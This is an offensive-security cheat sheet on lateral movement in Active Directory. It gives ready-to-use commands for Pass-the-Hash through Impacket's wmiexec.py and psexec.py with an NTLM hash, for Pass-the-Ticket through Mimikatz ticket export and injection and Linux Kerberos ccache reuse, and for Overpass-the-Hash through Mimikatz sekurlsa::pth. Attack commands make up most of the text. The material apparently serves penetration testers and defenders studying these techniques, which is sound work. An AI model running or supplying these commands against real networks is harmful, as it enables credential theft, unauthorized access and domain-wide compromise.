# Lateral Movement in Active Directory

Once initial access to a domain-joined machine is established, lateral movement allows an adversary to extend their foothold across workstations and servers toward the Domain Controllers.

---

### Pass-the-Hash (PtH) (T1550.002)

Pass-the-Hash allows an attacker to authenticate using an NTLM password hash without needing the cleartext password.

#### WMI Execution via Impacket:
```bash
wmiexec.py -hashes :7fc56270e7a70fa81a5935b726aa7b4e Administrator@10.10.10.15
```

#### SMB Execution via PsExec:
```bash
psexec.py -hashes :7fc56270e7a70fa81a5935b726aa7b4e domain.local/admin_user@10.10.10.15
```

---

### Pass-the-Ticket (PtT) (T1550.003)

Pass-the-Ticket reuses stolen Kerberos tickets (TGT/TGS) to access domain resources.

#### Injecting tickets with Mimikatz:
```text
privilege::debug
sekurlsa::tickets /export
kerberos::ptt "ticket_name.kirbi"
```

#### Linux Kerberos Ticket Usage:
```bash
export KRB5CCNAME=/path/to/ticket.ccache
smbclient -k //fileserver.domain.local/share
```

---

### Overpass-the-Hash / Pass-the-Key (PtK)

Using an NTLM or AES-256 key to request a legitimate Kerberos TGT from the KDC, converting an NTLM credential into a valid Kerberos session.

```text
sekurlsa::pth /user:target_user /domain:domain.local /ntlm:HASH /aes256:AESKEY
```
